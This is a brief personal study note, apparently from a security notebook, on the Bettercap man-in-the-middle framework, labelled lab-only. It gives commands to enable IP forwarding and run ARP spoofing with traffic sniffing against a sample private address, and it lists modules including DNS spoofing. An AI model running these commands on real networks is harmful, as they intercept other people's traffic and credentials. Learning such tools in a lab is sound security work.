---
tags: [tools,bettercap,mitm]
---

# Bettercap
Modern MITM / network attack framework. **Lab only.**
```
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0
# net.probe on; set arp.spoof.targets 10.0.0.5; arp.spoof on; net.sniff on
```
Modules: arp.spoof, net.sniff, http proxy, dns.spoof, caplets. Pairs with Wireshark to observe. See [[ARP]].
